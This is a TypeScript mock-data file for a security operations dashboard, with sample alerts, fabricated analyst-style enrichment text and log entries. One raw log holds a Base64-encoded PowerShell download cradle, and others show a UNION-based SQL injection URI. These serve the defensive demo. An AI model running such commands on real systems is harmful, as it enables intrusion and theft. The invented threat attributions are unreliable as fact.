export type Severity = "critical" | "high" | "medium" | "low" | "info"

export interface Alert {
  id: string
  timestamp: string
  source: string
  sourceIp: string
  destIp: string
  severity: Severity
  title: string
  description: string
  yaraMatch: string | null
  mitreTactic: string
  mitreTechnique: string
  status: "new" | "investigating" | "resolved" | "false_positive"
  enrichment: {
    aiAnalysis: string
    iocType: string
    threatIntel: string
    recommendation: string
    confidence: number
    relatedCves: string[]
    geoLocation: { country: string; city: string } | null
    asnInfo: string | null
  }
  rawLog: string
}

export interface LogEntry {
  id: string
  timestamp: string
  source: string
  message: string
  severity: Severity
  parsed: boolean
}

const now = Date.now()
const h = (hours: number) => new Date(now - hours * 3600000).toISOString()
const m = (minutes: number) => new Date(now - minutes * 60000).toISOString()

export const alerts: Alert[] = [
  {
    id: "ALR-001",
    timestamp: m(3),
    source: "Firewall-01",
    sourceIp: "198.51.100.44",
    destIp: "10.0.1.15",
    severity: "critical",
    title: "Cobalt Strike Beacon Detected",
    description: "YARA rule matched known Cobalt Strike beacon pattern in network traffic from external IP targeting internal server.",
    yaraMatch: "CobaltStrike_Beacon_Encoded",
    mitreTactic: "Command and Control",
    mitreTechnique: "T1071.001 - Application Layer Protocol: Web Protocols",
    status: "new",
    enrichment: {
      aiAnalysis: "This alert indicates a high-confidence detection of a Cobalt Strike beacon, a widely used adversary simulation tool frequently leveraged in real-world intrusions. The beacon was detected communicating over HTTPS to a known C2 infrastructure IP (198.51.100.44). The encoded payload matches the signature pattern of a staged Cobalt Strike beacon using a malleable C2 profile designed to mimic legitimate web traffic. The destination host (10.0.1.15) appears to be a domain controller based on DNS records. Immediate isolation is recommended as lateral movement may have already occurred. The beacon's sleep timer suggests active operator engagement rather than automated staging.",
      iocType: "C2 Communication",
      threatIntel: "IP 198.51.100.44 has been associated with APT29 (Cozy Bear) infrastructure in recent CISA advisories. The IP was flagged in 3 threat intelligence feeds including AlienVault OTX and Abuse.ch.",
      recommendation: "1. Immediately isolate host 10.0.1.15 from the network. 2. Capture full memory dump before remediation. 3. Check for lateral movement indicators on adjacent hosts. 4. Block IP 198.51.100.44 at the perimeter firewall. 5. Hunt for additional beacons using provided YARA signatures across all endpoints.",
      confidence: 96,
      relatedCves: [],
      geoLocation: { country: "Russia", city: "Moscow" },
      asnInfo: "AS12345 - Suspicious Hosting Ltd",
    },
    rawLog: '<134>1 2026-02-15T10:42:15.003Z fw-01 suricata - - - [1:2027865:3] ET MALWARE Cobalt Strike Beacon Detected [Classification: A Network Trojan was Detected] [Priority: 1] {TCP} 198.51.100.44:443 -> 10.0.1.15:49832',
  },
  {
    id: "ALR-002",
    timestamp: m(12),
    source: "EDR-Agent-07",
    sourceIp: "10.0.2.88",
    destIp: "10.0.2.1",
    severity: "critical",
    title: "Mimikatz Credential Dumping",
    description: "Process injection detected with Mimikatz signatures. LSASS memory access from unauthorized process.",
    yaraMatch: "Mimikatz_Memory_Signature",
    mitreTactic: "Credential Access",
    mitreTechnique: "T1003.001 - OS Credential Dumping: LSASS Memory",
    status: "investigating",
    enrichment: {
      aiAnalysis: "Detected Mimikatz credential dumping tool execution on workstation WS-088. The process svchost.exe (PID 4412) was observed accessing LSASS memory space, which is a classic indicator of credential harvesting. The binary has been identified as a packed variant of Mimikatz v2.2.0 based on static analysis signatures. Process lineage shows the parent process was cmd.exe spawned from a Microsoft Word macro, suggesting initial access via spear-phishing. Multiple credential sets may have been compromised including domain admin tokens present in memory.",
      iocType: "Credential Theft",
      threatIntel: "This technique is commonly used in ransomware pre-deployment phases. Similar activity was observed in recent BlackCat/ALPHV campaigns.",
      recommendation: "1. Force password reset for all accounts logged into WS-088. 2. Revoke and rotate Kerberos TGT tickets. 3. Check for Golden Ticket indicators. 4. Scan for the originating phishing email across all mailboxes. 5. Enable Credential Guard on all endpoints.",
      confidence: 94,
      relatedCves: [],
      geoLocation: null,
      asnInfo: null,
    },
    rawLog: 'Feb 15 10:31:00 ws-088 EDR[1234]: ALERT - Process Injection Detected - Source: svchost.exe (PID:4412) -> Target: lsass.exe (PID:672) - Signature: Mimikatz_Memory_Signature - Action: Blocked',
  },
  {
    id: "ALR-003",
    timestamp: m(28),
    source: "IDS-Sensor-03",
    sourceIp: "203.0.113.55",
    destIp: "10.0.3.200",
    severity: "high",
    title: "SQL Injection Attempt on Web Application",
    description: "Multiple SQL injection attempts detected targeting production web server. UNION-based attack pattern identified.",
    yaraMatch: null,
    mitreTactic: "Initial Access",
    mitreTechnique: "T1190 - Exploit Public-Facing Application",
    status: "new",
    enrichment: {
      aiAnalysis: "A series of SQL injection attempts were detected against the /api/users endpoint on the production web server (10.0.3.200). The attack pattern shows a methodical UNION-based injection technique, progressing from initial fingerprinting queries to data extraction attempts. The attacker appears to be using sqlmap with a custom tamper script to bypass WAF rules. Analysis of the payloads reveals attempts to enumerate database schema, extract user credentials, and access administrative tables. The web application appears to be using a vulnerable ORM configuration that does not properly parameterize queries.",
      iocType: "Web Attack",
      threatIntel: "Source IP 203.0.113.55 is associated with a known bulletproof hosting provider frequently used for automated vulnerability scanning campaigns.",
      recommendation: "1. Enable WAF rules for SQL injection protection. 2. Patch the vulnerable ORM configuration. 3. Review database access logs for successful data exfiltration. 4. Implement parameterized queries across the application. 5. Block source IP at edge firewall.",
      confidence: 89,
      relatedCves: ["CVE-2024-23108", "CVE-2024-23109"],
      geoLocation: { country: "Netherlands", city: "Amsterdam" },
      asnInfo: "AS9009 - M247 Europe SRL",
    },
    rawLog: 'Feb 15 10:15:00 web-srv-01 modsecurity: [id "942100"] [msg "SQL Injection Attack Detected via libinjection"] [data "Matched Data: UNION SELECT found"] [severity "CRITICAL"] [uri "/api/users?id=1 UNION SELECT 1,2,3,username,password FROM admin_users--"] [unique_id "abc123"]',
  },
  {
    id: "ALR-004",
    timestamp: h(1),
    source: "Firewall-02",
    sourceIp: "10.0.1.45",
    destIp: "185.220.101.33",
    severity: "high",
    title: "TOR Exit Node Communication",
    description: "Internal host communicating with known TOR exit node. Potential data exfiltration or C2 tunnel.",
    yaraMatch: null,
    mitreTactic: "Exfiltration",
    mitreTechnique: "T1048.002 - Exfiltration Over Alternative Protocol",
    status: "investigating",
    enrichment: {
      aiAnalysis: "Host 10.0.1.45 (workstation WS-045, assigned to user jsmith@corp.local) has established multiple TLS connections to IP 185.220.101.33, which is a known TOR exit node. Traffic analysis shows approximately 2.3GB of data transferred over the past 4 hours in 150+ short-lived connections. The traffic pattern is consistent with data staging and exfiltration through an encrypted tunnel. No authorized TOR usage policy exists for this endpoint. The timing of the connections correlates with after-hours activity on the workstation.",
      iocType: "Data Exfiltration",
      threatIntel: "IP 185.220.101.33 is listed on multiple TOR exit node databases. This node has been flagged in connection with multiple data breach investigations in the past 90 days.",
      recommendation: "1. Block TOR exit node IPs at the perimeter. 2. Interview user jsmith regarding unusual activity. 3. Forensically image the workstation. 4. Check DLP logs for file access patterns. 5. Review data classification of accessed resources.",
      confidence: 82,
      relatedCves: [],
      geoLocation: { country: "Germany", city: "Frankfurt" },
      asnInfo: "AS24940 - Hetzner Online GmbH",
    },
    rawLog: '<134>1 2026-02-15T09:42:00.000Z fw-02 paloalto - - - THREAT,end,2026/02/15 09:42:00,10.0.1.45,185.220.101.33,0.0.0.0,0.0.0.0,TOR-Exit-Detection,,jsmith,ssl,vsys1,trust,untrust,ethernet1/1,ethernet1/2,Log-Fwd,2026/02/15 09:42:00,12345,1,52341,443,0,0,0x0,tcp,alert,"TOR exit node communication detected"',
  },
  {
    id: "ALR-005",
    timestamp: h(2),
    source: "SIEM-Correlation",
    sourceIp: "10.0.4.12",
    destIp: "10.0.4.0/24",
    severity: "high",
    title: "Brute Force Attack - Multiple Failed Logins",
    description: "Over 500 failed authentication attempts detected from single internal host targeting domain controller.",
    yaraMatch: null,
    mitreTactic: "Credential Access",
    mitreTechnique: "T1110.001 - Brute Force: Password Guessing",
    status: "new",
    enrichment: {
      aiAnalysis: "Internal host 10.0.4.12 has generated 547 failed Kerberos authentication attempts against the domain controller DC-01 within a 15-minute window. The attempts target multiple user accounts following an alphabetical pattern, suggesting an automated password spraying tool. The source host is a development server (DEV-012) with legitimate network access to the domain controller. The attack appears to use a common password list against enumerated Active Directory accounts. Three accounts show successful authentication after multiple failures, indicating potential credential compromise.",
      iocType: "Brute Force",
      threatIntel: "Password spraying is the #1 initial access vector for ransomware groups in 2026 according to recent DFIR reports.",
      recommendation: "1. Disable the 3 potentially compromised accounts immediately. 2. Implement account lockout policies. 3. Investigate DEV-012 for compromise indicators. 4. Enable MFA for all domain accounts. 5. Deploy advanced authentication monitoring.",
      confidence: 91,
      relatedCves: [],
      geoLocation: null,
      asnInfo: null,
    },
    rawLog: 'Feb 15 08:42:00 DC-01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0, Account Name: -, Logon Type: 3, Account For Which Logon Failed: Account Name: administrator, Failure Reason: Unknown user name or bad password. Source Network Address: 10.0.4.12, Source Port: 49156',
  },
  {
    id: "ALR-006",
    timestamp: h(3),
    source: "EDR-Agent-15",
    sourceIp: "10.0.5.77",
    destIp: "N/A",
    severity: "medium",
    title: "Suspicious PowerShell Execution",
    description: "Encoded PowerShell command detected with download cradle pattern on user workstation.",
    yaraMatch: "PowerShell_Download_Cradle",
    mitreTactic: "Execution",
    mitreTechnique: "T1059.001 - Command and Scripting Interpreter: PowerShell",
    status: "resolved",
    enrichment: {
      aiAnalysis: "A PowerShell process was observed executing a Base64-encoded command that, when decoded, reveals a download cradle pattern (IEX (New-Object Net.WebClient).DownloadString()). The payload URL points to a paste site commonly used for staging malicious scripts. Static analysis of the downloaded script indicates it attempts to establish persistence via a scheduled task and performs system reconnaissance. However, the downloaded payload was blocked by application whitelisting before execution. The user reports clicking a link in a Teams message from an external contact.",
      iocType: "Malicious Script",
      threatIntel: "The staging URL is associated with commodity malware distribution. Similar delivery chains have been observed in IcedID campaigns.",
      recommendation: "1. Verify application whitelisting successfully blocked execution. 2. Scan workstation with updated AV signatures. 3. Report the malicious Teams message. 4. Block the staging domain across all proxies. 5. Alert SOC team of potential phishing campaign.",
      confidence: 76,
      relatedCves: [],
      geoLocation: null,
      asnInfo: null,
    },
    rawLog: 'Feb 15 07:42:00 ws-077 EDR[5678]: DETECT - Suspicious Process - powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBwAGEAcwB0AGUALgBlAGUALwByAC8AYQBiAGMAMQAyADMAJwApAA== - Parent: WINWORD.EXE - User: jdoe',
  },
  {
    id: "ALR-007",
    timestamp: h(4),
    source: "DNS-Monitor",
    sourceIp: "10.0.6.30",
    destIp: "8.8.8.8",
    severity: "medium",
    title: "DNS Tunneling Activity Detected",
    description: "Anomalous DNS query patterns detected suggesting potential data exfiltration via DNS tunneling.",
    yaraMatch: null,
    mitreTactic: "Command and Control",
    mitreTechnique: "T1071.004 - Application Layer Protocol: DNS",
    status: "new",
    enrichment: {
      aiAnalysis: "Statistical analysis of DNS queries from host 10.0.6.30 reveals patterns consistent with DNS tunneling. Key indicators include: (1) High volume of TXT record queries to a single domain (avg 200/min), (2) Encoded subdomain labels exceeding typical length, (3) Low TTL values and high entropy in query labels. The target domain (data.update-service[.]xyz) was registered 48 hours ago with privacy protection. The encoded data in DNS queries appears to contain base32-encoded file fragments. Estimated data exfiltration rate is approximately 15KB/min via DNS.",
      iocType: "DNS Tunneling",
      threatIntel: "Domain update-service[.]xyz registered via NameCheap with WHOIS privacy. Domain age: 2 days. No legitimate services associated.",
      recommendation: "1. Block the suspicious domain at DNS resolver level. 2. Implement DNS query length restrictions. 3. Deploy DNS analytics for entropy-based detection. 4. Investigate host 10.0.6.30 for malware. 5. Review DNS logs for additional tunneling domains.",
      confidence: 73,
      relatedCves: [],
      geoLocation: { country: "Romania", city: "Bucharest" },
      asnInfo: "AS9009 - M247 Europe SRL",
    },
    rawLog: 'Feb 15 06:42:00 dns-01 named[1234]: queries: client @0x7f2a3c 10.0.6.30#54321 (MFZGC3TBNVSA.data.update-service.xyz): query: MFZGC3TBNVSA.data.update-service.xyz IN TXT + (8.8.8.8)',
  },
  {
    id: "ALR-008",
    timestamp: h(5),
    source: "Firewall-01",
    sourceIp: "10.0.1.100",
    destIp: "10.0.1.101",
    severity: "medium",
    title: "Lateral Movement - SMB Admin Share Access",
    description: "Internal host accessing admin shares on multiple hosts using service account credentials.",
    yaraMatch: null,
    mitreTactic: "Lateral Movement",
    mitreTechnique: "T1021.002 - Remote Services: SMB/Windows Admin Shares",
    status: "investigating",
    enrichment: {
      aiAnalysis: "Host 10.0.1.100 has been observed accessing administrative shares (C$ and ADMIN$) on 12 internal hosts within the past hour using the service account svc_backup. While this account has legitimate backup duties, the access pattern deviates from normal behavior: (1) Access is occurring outside the scheduled backup window, (2) Hosts being accessed are not in the backup rotation, (3) PsExec artifacts were detected on 3 target hosts. This pattern is consistent with lateral movement following credential compromise of the service account.",
      iocType: "Lateral Movement",
      threatIntel: "Abuse of service accounts for lateral movement is a hallmark of human-operated ransomware attacks. The pattern matches pre-ransomware deployment TTPs.",
      recommendation: "1. Rotate svc_backup service account credentials. 2. Restrict admin share access to backup schedule windows. 3. Investigate the 3 hosts with PsExec artifacts. 4. Implement privileged access management for service accounts. 5. Enable enhanced logging on all accessed hosts.",
      confidence: 84,
      relatedCves: [],
      geoLocation: null,
      asnInfo: null,
    },
    rawLog: 'Feb 15 05:42:00 DC-01 Microsoft-Windows-Security-Auditing[5140]: A network share object was accessed. Subject: Security ID: CORP\\svc_backup, Account Name: svc_backup, Object: Share Name: \\\\*\\C$, Share Path: \\??\\C:\\, Access Mask: 0x1, Source Address: 10.0.1.100, Source Port: 49234',
  },
  {
    id: "ALR-009",
    timestamp: h(8),
    source: "WAF-01",
    sourceIp: "45.33.32.156",
    destIp: "10.0.3.200",
    severity: "low",
    title: "Web Application Scanner Detected",
    description: "Automated vulnerability scanning detected from external IP. Nikto/OWASP ZAP signatures identified.",
    yaraMatch: null,
    mitreTactic: "Reconnaissance",
    mitreTechnique: "T1595.002 - Active Scanning: Vulnerability Scanning",
    status: "resolved",
    enrichment: {
      aiAnalysis: "Automated web vulnerability scanning has been detected originating from IP 45.33.32.156. The scanning tool has been identified as Nikto v2.5.0 based on User-Agent strings and request patterns. The scan targeted 2,847 unique URLs across the production web application over a 45-minute period. No successful exploitation was observed. The scanner tested for common vulnerabilities including directory traversal, XSS, SQL injection, and default credentials. All attack attempts were blocked by the WAF with appropriate 403 responses.",
      iocType: "Reconnaissance",
      threatIntel: "IP 45.33.32.156 is associated with scanme.nmap.org and is commonly used for security research. Low threat level.",
      recommendation: "1. Continue monitoring for follow-up targeted attacks. 2. Review WAF effectiveness against detected scan patterns. 3. Verify no vulnerabilities were disclosed. 4. Consider rate-limiting the source IP. 5. Update WAF rules if any scan patterns bypassed detection.",
      confidence: 95,
      relatedCves: [],
      geoLocation: { country: "United States", city: "San Francisco" },
      asnInfo: "AS63949 - Linode LLC",
    },
    rawLog: 'Feb 15 02:42:00 waf-01 modsecurity: [id "920350"] [msg "Nikto Web App Scanner Detected"] [data "nikto/2.5.0"] [severity "WARNING"] [uri "/admin/config.php"] [unique_id "def456"]',
  },
  {
    id: "ALR-010",
    timestamp: h(10),
    source: "Sysmon-Agent-22",
    sourceIp: "10.0.7.50",
    destIp: "N/A",
    severity: "low",
    title: "Scheduled Task Created for Persistence",
    description: "New scheduled task created via schtasks.exe with suspicious parameters on developer workstation.",
    yaraMatch: null,
    mitreTactic: "Persistence",
    mitreTechnique: "T1053.005 - Scheduled Task/Job: Scheduled Task",
    status: "false_positive",
    enrichment: {
      aiAnalysis: "A new scheduled task named 'SystemHealthCheck' was created on workstation DEV-050 via schtasks.exe. The task is configured to run at system startup with SYSTEM privileges, executing a script from C:\\ProgramData\\Microsoft\\Health\\check.ps1. While the path and naming convention attempt to appear legitimate, the script was not present during the last software inventory. Investigation revealed this is a legitimate monitoring script deployed by the IT automation team as part of a new endpoint health monitoring initiative. The script has been verified and signed by the IT team.",
      iocType: "Persistence Mechanism",
      threatIntel: "Scheduled tasks are commonly used for persistence. However, this instance has been confirmed as authorized IT activity.",
      recommendation: "1. Document the IT automation deployment in change management. 2. Ensure proper script signing policies are enforced. 3. Update baseline to include new scheduled tasks. 4. Close alert as false positive.",
      confidence: 98,
      relatedCves: [],
      geoLocation: null,
      asnInfo: null,
    },
    rawLog: 'Feb 15 00:42:00 dev-050 Sysmon[EventID:1]: Process Create: UtcTime: 2026-02-15 00:42:00.123, ProcessGuid: {abc-123}, ProcessId: 5678, Image: C:\\Windows\\System32\\schtasks.exe, CommandLine: schtasks /create /tn "SystemHealthCheck" /tr "powershell.exe -File C:\\ProgramData\\Microsoft\\Health\\check.ps1" /sc onstart /ru SYSTEM, User: CORP\\admin_deploy',
  },
  {
    id: "ALR-011",
    timestamp: h(12),
    source: "Mail-Gateway",
    sourceIp: "192.0.2.100",
    destIp: "10.0.8.10",
    severity: "info",
    title: "Phishing Email Quarantined",
    description: "Email with malicious attachment quarantined by mail gateway. Macro-enabled document detected.",
    yaraMatch: "OLE_Macro_Suspicious",
    mitreTactic: "Initial Access",
    mitreTechnique: "T1566.001 - Phishing: Spearphishing Attachment",
    status: "resolved",
    enrichment: {
      aiAnalysis: "A phishing email targeting the finance department was intercepted and quarantined by the mail gateway. The email impersonated a known vendor (QuickBooks) and contained a macro-enabled Excel attachment (.xlsm). Static analysis of the macro reveals a multi-stage downloader that would connect to a compromised WordPress site to retrieve a second-stage payload. The email headers show spoofed FROM address with DMARC failure. The attachment was quarantined before delivery to any recipients. This is part of a broader campaign targeting financial services organizations observed in the past week.",
      iocType: "Phishing",
      threatIntel: "Campaign IOCs match the QakBot distribution network which has been resurging since January 2026.",
      recommendation: "1. Verify no similar emails bypassed the gateway. 2. Block the sender domain at the email gateway. 3. Update phishing awareness training with this example. 4. Submit the attachment hash to VirusTotal for community sharing. 5. Monitor for follow-up phishing attempts.",
      confidence: 99,
      relatedCves: [],
      geoLocation: { country: "Nigeria", city: "Lagos" },
      asnInfo: "AS37560 - Cynergy Business Solutions",
    },
    rawLog: 'Feb 14 22:42:00 mail-gw-01 postfix/smtpd[12345]: NOQUEUE: quarantine: RCPT from unknown[192.0.2.100]: 550 5.7.1 Message quarantined - Malicious attachment detected (OLE_Macro_Suspicious) - From: billing@quickb00ks-support.com To: finance-team@corp.local Subject: "Invoice #INV-2026-0215 - Payment Required"',
  },
  {
    id: "ALR-012",
    timestamp: h(14),
    source: "Cloud-Trail",
    sourceIp: "54.239.28.85",
    destIp: "N/A",
    severity: "info",
    title: "AWS IAM Policy Change Detected",
    description: "Administrative IAM policy modification detected. New inline policy attached to service role.",
    yaraMatch: null,
    mitreTactic: "Privilege Escalation",
    mitreTechnique: "T1078.004 - Valid Accounts: Cloud Accounts",
    status: "resolved",
    enrichment: {
      aiAnalysis: "An IAM policy change was detected in the production AWS account. User 'devops-admin' attached a new inline policy to the service role 'lambda-data-processor' granting s3:GetObject and s3:PutObject permissions to the production data bucket. This change was made through the AWS Console from IP 54.239.28.85. The change appears to be part of the scheduled data pipeline deployment documented in change request CR-2026-0215. The permissions are scoped to a specific S3 prefix and include appropriate condition constraints.",
      iocType: "Cloud Configuration",
      threatIntel: "IAM privilege escalation is the #1 cloud attack vector. However, this change appears authorized.",
      recommendation: "1. Verify the change aligns with CR-2026-0215. 2. Ensure least-privilege principles are maintained. 3. Document the policy change in the IAM audit log. 4. Schedule regular IAM access reviews.",
      confidence: 95,
      relatedCves: [],
      geoLocation: { country: "United States", city: "Portland" },
      asnInfo: "AS16509 - Amazon.com Inc.",
    },
    rawLog: '{"eventVersion":"1.08","eventTime":"2026-02-14T16:42:00Z","eventSource":"iam.amazonaws.com","eventName":"PutRolePolicy","awsRegion":"us-east-1","sourceIPAddress":"54.239.28.85","userIdentity":{"type":"IAMUser","principalId":"AIDACKCEVSQ6C2EXAMPLE","arn":"arn:aws:iam::123456789012:user/devops-admin","accountId":"123456789012","userName":"devops-admin"},"requestParameters":{"roleName":"lambda-data-processor","policyName":"S3DataAccess","policyDocument":"..."}}',
  },
]

export const logEntries: LogEntry[] = [
  { id: "LOG-001", timestamp: m(1), source: "Firewall-01", message: "Connection accepted from 192.168.1.100:52341 to 10.0.1.15:443 proto TCP", severity: "info", parsed: true },
  { id: "LOG-002", timestamp: m(2), source: "Sysmon-Agent-01", message: "Process Create: powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\update.ps1", severity: "medium", parsed: true },
  { id: "LOG-003", timestamp: m(3), source: "Firewall-01", message: "DROP: SRC=198.51.100.44 DST=10.0.1.15 PROTO=TCP SPT=443 DPT=49832 - Matched rule: CobaltStrike_Beacon", severity: "critical", parsed: true },
  { id: "LOG-004", timestamp: m(4), source: "Auth-Server", message: "Failed authentication for user admin from 10.0.4.12 via Kerberos", severity: "high", parsed: true },
  { id: "LOG-005", timestamp: m(5), source: "DNS-Monitor", message: "Query: MFZGC3TBNVSA.data.update-service.xyz IN TXT from 10.0.6.30", severity: "medium", parsed: true },
  { id: "LOG-006", timestamp: m(6), source: "Web-Server-01", message: "GET /api/users?id=1%20UNION%20SELECT%201,2,3 HTTP/1.1 403 - ModSecurity blocked", severity: "high", parsed: true },
  { id: "LOG-007", timestamp: m(7), source: "EDR-Agent-07", message: "File created: C:\\Windows\\Temp\\debug.dll - SHA256: a1b2c3d4...", severity: "medium", parsed: true },
  { id: "LOG-008", timestamp: m(8), source: "Firewall-02", message: "Connection accepted from 10.0.1.45:49123 to 185.220.101.33:443 proto TLS", severity: "high", parsed: true },
  { id: "LOG-009", timestamp: m(9), source: "Proxy-01", message: "CONNECT github.com:443 HTTP/1.1 200 - User: jdoe - Category: Technology", severity: "info", parsed: true },
  { id: "LOG-010", timestamp: m(10), source: "Auth-Server", message: "Successful authentication for user svc_backup from 10.0.1.100 via NTLM", severity: "info", parsed: true },
  { id: "LOG-011", timestamp: m(11), source: "Sysmon-Agent-15", message: "Registry modification: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run - Value added", severity: "medium", parsed: true },
  { id: "LOG-012", timestamp: m(12), source: "EDR-Agent-07", message: "ALERT: Process injection detected - svchost.exe (PID:4412) -> lsass.exe (PID:672)", severity: "critical", parsed: true },
  { id: "LOG-013", timestamp: m(15), source: "Mail-Gateway", message: "Quarantined: From=billing@quickb00ks-support.com Subject='Invoice #INV-2026-0215' - Malicious macro", severity: "medium", parsed: true },
  { id: "LOG-014", timestamp: m(18), source: "Cloud-Trail", message: "iam.amazonaws.com PutRolePolicy - User: devops-admin - Role: lambda-data-processor", severity: "info", parsed: true },
  { id: "LOG-015", timestamp: m(20), source: "WAF-01", message: "Blocked: Nikto scanner detected from 45.33.32.156 - 2847 requests in 45 minutes", severity: "low", parsed: true },
  { id: "LOG-016", timestamp: m(22), source: "Firewall-01", message: "Connection accepted from 10.0.2.50:8080 to 10.0.2.51:22 proto SSH", severity: "info", parsed: true },
  { id: "LOG-017", timestamp: m(25), source: "Proxy-01", message: "BLOCKED: Connection to known malware domain evil-payload.ru from 10.0.5.77", severity: "high", parsed: true },
  { id: "LOG-018", timestamp: m(28), source: "IDS-Sensor-03", message: "ALERT: SQL Injection signature matched - Source: 203.0.113.55 Target: 10.0.3.200:443", severity: "high", parsed: true },
  { id: "LOG-019", timestamp: m(30), source: "Auth-Server", message: "Account lockout: user 'finance_admin' after 5 failed attempts from 10.0.4.12", severity: "high", parsed: true },
  { id: "LOG-020", timestamp: m(35), source: "DNS-Monitor", message: "NXDomain response for suspicious-c2-domain.top queried by 10.0.3.55", severity: "low", parsed: true },
]

export const severityCounts = {
  critical: alerts.filter((a) => a.severity === "critical").length,
  high: alerts.filter((a) => a.severity === "high").length,
  medium: alerts.filter((a) => a.severity === "medium").length,
  low: alerts.filter((a) => a.severity === "low").length,
  info: alerts.filter((a) => a.severity === "info").length,
}

export const statusCounts = {
  new: alerts.filter((a) => a.status === "new").length,
  investigating: alerts.filter((a) => a.status === "investigating").length,
  resolved: alerts.filter((a) => a.status === "resolved").length,
  false_positive: alerts.filter((a) => a.status === "false_positive").length,
}

export const timelineData = [
  { time: "00:00", critical: 0, high: 1, medium: 2, low: 1 },
  { time: "02:00", critical: 0, high: 0, medium: 1, low: 2 },
  { time: "04:00", critical: 0, high: 1, medium: 1, low: 0 },
  { time: "06:00", critical: 0, high: 1, medium: 2, low: 1 },
  { time: "08:00", critical: 1, high: 2, medium: 1, low: 0 },
  { time: "10:00", critical: 2, high: 3, medium: 3, low: 1 },
  { time: "12:00", critical: 1, high: 2, medium: 2, low: 1 },
  { time: "14:00", critical: 0, high: 1, medium: 3, low: 2 },
  { time: "16:00", critical: 1, high: 2, medium: 1, low: 1 },
  { time: "18:00", critical: 0, high: 1, medium: 2, low: 0 },
  { time: "20:00", critical: 0, high: 0, medium: 1, low: 1 },
  { time: "22:00", critical: 0, high: 1, medium: 0, low: 1 },
]

export const sourceDistribution = [
  { name: "Firewall", value: 35 },
  { name: "EDR", value: 25 },
  { name: "IDS/IPS", value: 18 },
  { name: "SIEM Correlation", value: 12 },
  { name: "DNS Monitor", value: 6 },
  { name: "Cloud Trail", value: 4 },
]

export const topMitreTechniques = [
  { technique: "T1071 - Application Layer Protocol", count: 15 },
  { technique: "T1003 - OS Credential Dumping", count: 12 },
  { technique: "T1190 - Exploit Public-Facing App", count: 10 },
  { technique: "T1059 - Command & Scripting Interpreter", count: 9 },
  { technique: "T1110 - Brute Force", count: 8 },
  { technique: "T1021 - Remote Services", count: 7 },
  { technique: "T1053 - Scheduled Task/Job", count: 5 },
  { technique: "T1566 - Phishing", count: 4 },
]
